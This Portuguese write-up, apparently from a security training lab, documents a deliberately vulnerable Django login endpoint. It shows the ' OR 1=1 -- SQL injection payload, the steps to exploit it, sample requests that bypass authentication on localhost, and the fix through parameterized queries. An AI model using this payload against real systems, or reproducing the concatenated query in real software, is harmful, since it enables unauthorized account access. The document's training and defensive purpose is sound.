# SQL Injection no Login (Ciclo 1)

## Nome

SQL Injection em endpoint de autenticação vulnerável.

## Descrição

O endpoint `POST /api/auth/vuln/sqli-login/` monta a consulta SQL por concatenação direta de strings usando dados recebidos do cliente (`username` e `password`).

Essa prática permite que um atacante injete comandos SQL no campo de entrada, alterando a lógica da consulta e burlando o processo de autenticação.

## Endpoint afetado

- Vulnerável: `POST /api/auth/vuln/sqli-login/`
- Seguro (correção): `POST /api/auth/secure/login/`

## Como explorar

1. Enviar requisição normal com credenciais inválidas e observar falha.
2. Reenviar para o endpoint vulnerável com payload de injeção no campo `username`.
3. Confirmar que a autenticação é aceita indevidamente.

Payload de exemplo:

```json
{
  "username": "' OR 1=1 -- ",
  "password": "x"
}
```

## Impacto

- Bypass de autenticação sem senha válida
- Acesso indevido a contas/sessões
- Possível escalada para comprometimento completo da aplicação
- Perda de confidencialidade e integridade de dados

## Como corrigir

- Nunca montar SQL com concatenação de input do usuário.
- Usar autenticação do framework (`django.contrib.auth.authenticate`) ou queries parametrizadas.
- Validar entradas e retornar erros consistentes sem expor detalhes internos.

No projeto, a correção foi aplicada no endpoint:
- `POST /api/auth/secure/login/`

## Exemplo real (request/response)

### 1) Tentativa sem injeção (esperado: falha)

Request:

```http
POST /api/auth/vuln/sqli-login/ HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/json

{"username":"usuario_inexistente","password":"senha_errada"}
```

Response (exemplo):

```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"authenticated": false, "detail": "Credenciais inválidas."}
```

### 2) Exploração com SQL Injection (esperado: bypass)

Request:

```http
POST /api/auth/vuln/sqli-login/ HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/json

{"username":"' OR 1=1 -- ","password":"x"}
```

Response (exemplo):

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "authenticated": true,
  "detail": "Login aceito pela versão vulnerável.",
  "user": {"id": 1, "username": "admin"},
  "warning": "Endpoint intencionalmente vulnerável a SQL Injection."
}
```

### 3) Mesmo payload no endpoint seguro (esperado: bloqueio)

Request:

```http
POST /api/auth/secure/login/ HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/json

{"username":"' OR 1=1 -- ","password":"x"}
```

Response (exemplo):

```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"authenticated": false, "detail": "Credenciais inválidas."}
```

## Evidências recomendadas para anexar

- Captura da requisição/resposta no Burp Repeater (vulnerável)
- Captura da requisição/resposta no endpoint seguro
- Diferença visual entre retorno 200 (vulnerável) e 401 (seguro)
